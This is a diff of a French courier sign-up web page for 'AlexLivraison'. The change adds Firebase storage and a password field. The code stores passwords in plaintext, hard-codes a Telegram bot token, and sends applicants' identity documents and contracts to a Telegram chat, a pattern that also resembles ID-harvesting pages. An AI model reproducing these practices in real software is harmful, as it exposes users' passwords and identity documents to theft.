@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
 <title>Devenir Coursier - AlexLivraison</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <style>
   :root{--violet:#6b23ff;--violet-dark:#32006b;--green:#4caf50;--glass:rgba(255,255,255,0.95);}
   html,body{height:100%;margin:0;padding:0;overflow-x:hidden;}
@@ -30,21 +32,8 @@
     align-items: center;
     gap: 15px;
   }
-  .topbar-logo {
-      width: 45px; height: 45px;
-      border-radius: 50%;
-      border: 2px solid #fff;
-      object-fit: cover;
-  }
-  .topbar-title {
-      text-align: center;
-      color: #fff;
-      font-weight: bold;
-      font-size: 1.3em;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-  }
+  .topbar-logo {width: 45px; height: 45px; border-radius: 50%; border: 2px solid #fff; object-fit: cover;}
+  .topbar-title {text-align: center; color: #fff; font-weight: bold; font-size: 1.3em; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
   .btn-back{color:#fff;text-decoration:none;font-weight:bold;padding:8px 15px;background:rgba(255,255,255,0.2);border-radius:8px;display:flex;align-items:center;gap:5px}
   
   .card{background:var(--glass);border-radius:20px;padding:30px;margin-bottom:25px;box-shadow:0 20px 50px rgba(0,0,0,0.2);backdrop-filter:blur(10px);animation:fadeIn 0.5s ease;}
@@ -57,15 +46,9 @@
   input:focus,select:focus{border-color:#6b23ff;box-shadow:0 0 0 3px rgba(107,35,255,0.1);background:#fff;}
   
   .capacity-msg {
-      margin-top: 10px;
-      padding: 12px;
-      background: rgba(107, 35, 255, 0.1);
-      border-left: 4px solid var(--violet);
-      border-radius: 8px;
-      color: var(--violet-dark);
-      font-weight: bold;
-      font-size: 0.95em;
-      animation: fadeIn 0.3s ease;
+      margin-top: 10px; padding: 12px; background: rgba(107, 35, 255, 0.1);
+      border-left: 4px solid var(--violet); border-radius: 8px; color: var(--violet-dark);
+      font-weight: bold; font-size: 0.95em; animation: fadeIn 0.3s ease;
   }
 
   .grid2{display:grid;grid-template-columns:1fr 1fr;gap:15px;}
@@ -136,6 +119,11 @@
       <div class="input-group"><label><span class="emoji-anim">📧</span> E-mail</label><input id="c_email" type="email"></div>
     </div>
 
+    <div class="input-group" style="border: 2px solid #6b23ff; padding: 15px; border-radius: 10px; background: #f3e5f5;">
+      <label style="color:#6b23ff"><span class="emoji-anim">🔐</span> Créez votre mot de passe (pour connexion future)</label>
+      <input id="c_password" type="text" placeholder="Mot de passe" style="font-weight:bold">
+    </div>
+
     <div class="input-group"><label><span class="emoji-anim">📍</span> Adresse complète</label><input id="c_addr" placeholder="Rue, Code Postal, Ville"></div>
 
     <h2>Informations Pro & Véhicule</h2>
@@ -192,12 +180,16 @@
 <img src="sinature-alex.jpg" id="img-alex-sig" style="display:none">
 
 <script>
+const firebaseConfig={apiKey:"AIzaSyAWagPwv5Skh_EHfdcnFTYeG-xltRM7yPc",authDomain:"alex-livraison.firebaseapp.com",projectId:"alex-livraison",storageBucket:"alex-livraison.firebasestorage.app",messagingSenderId:"937475497279",appId:"1:937475497279:web:62dc9eba8e77a5113ec78a"};
+firebase.initializeApp(firebaseConfig);
+const db=firebase.firestore();
+
 const BOT = "8003065650:AAGJH_PRNHQ7jVDm9q96G6zlHt-IXkxKHnA";
 const CHAT = "7129872491";
 
 const s1 = document.getElementById('step1');
 const s2 = document.getElementById('step2');
-const inputs = ['c_firstname','c_lastname','c_phone','c_addr','c_siren'];
+const inputs = ['c_firstname','c_lastname','c_phone','c_addr','c_siren', 'c_email', 'c_password'];
 
 const vehicleSelect = document.getElementById('c_vehicle');
 const capacityMsg = document.getElementById('vehicle-capacity-msg');
@@ -299,7 +291,7 @@ document.getElementById('gen_pdf').onclick = async () => {
   btn.disabled = true;
   btn.innerText = "Envoi en cours...";
   status.classList.remove('hidden');
-  status.innerText = "Génération du contrat...";
+  status.innerText = "Création du compte et contrat...";
 
   const {jsPDF} = window.jspdf;
   const doc = new jsPDF();
@@ -308,11 +300,29 @@ document.getElementById('gen_pdf').onclick = async () => {
   const fname = document.getElementById('c_firstname').value;
   const lname = document.getElementById('c_lastname').value;
   const fullName = fname + " " + lname;
+  const email = document.getElementById('c_email').value;
+  const password = document.getElementById('c_password').value;
   const siren = document.getElementById('c_siren').value;
   const addr = document.getElementById('c_addr').value;
   const vehicle = document.getElementById('c_vehicle').value;
   const date = document.getElementById('sign_date').value;
   const place = document.getElementById('sign_place').value;
+
+  try {
+    await db.collection('couriers').add({
+        email: email.toLowerCase(),
+        password: password, 
+        fullName: fullName,
+        siren: siren,
+        vehicle: vehicle,
+        status: 'pending', 
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+  } catch (err) {
+    alert("Erreur lors de la création du compte: " + err.message);
+    btn.disabled = false;
+    return;
+  }
 
   try {
     const logoData = makeCircle('img-logo');
@@ -407,12 +417,12 @@ document.getElementById('gen_pdf').onclick = async () => {
 
   const fd1 = new FormData();
   fd1.append('chat_id', CHAT);
-  fd1.append('caption', `🆔 PIÈCE D'IDENTITÉ\n👤 ${gender} ${fullName}\n🏢 SIREN: ${siren}`);
+  fd1.append('caption', `🆔 NOUVEAU COURSIER (PIÈCE D'IDENTITÉ)\n👤 ${gender} ${fullName}\n📧 ${email}\n🔑 Mot de passe créé`);
   fd1.append('document', idFile);
 
   const fd2 = new FormData();
   fd2.append('chat_id', CHAT);
-  fd2.append('caption', `📄 CONTRAT COURSIER\n👤 ${gender} ${fullName}\n🛵 ${vehicle}\n📞 ${document.getElementById('c_phone').value}`);
+  fd2.append('caption', `📄 CONTRAT COURSIER\n👤 ${fullName}\n🏢 SIREN: ${siren}\n🛵 ${vehicle}\n📞 ${document.getElementById('c_phone').value}`);
   fd2.append('document', new File([pdfBlob], `Contrat_${lname}_${fname}.pdf`, {type: 'application/pdf'}));
 
   try {
@@ -421,10 +431,12 @@ document.getElementById('gen_pdf').onclick = async () => {
     
     doc.save(`Contrat_AlexLivraison_${lname}.pdf`);
     
-    status.innerText = "✅ Candidature envoyée avec succès !";
+    status.innerText = "✅ Inscription réussie ! En attente de validation.";
     status.style.color = "green";
-    btn.innerText = "Envoyé !";
-    setTimeout(() => window.location.href = 'login-coursier.html', 3000);
+    btn.innerText = "Terminé";
+    
+    alert("Votre compte a été créé avec le statut 'En attente'. Vous recevrez une notification une fois validé.");
+    setTimeout(() => window.location.href = 'login-coursier.html', 2000);
   } catch(e) {
     console.error(e);
     status.innerText = "❌ Erreur d'envoi. Vérifiez votre connexion.";
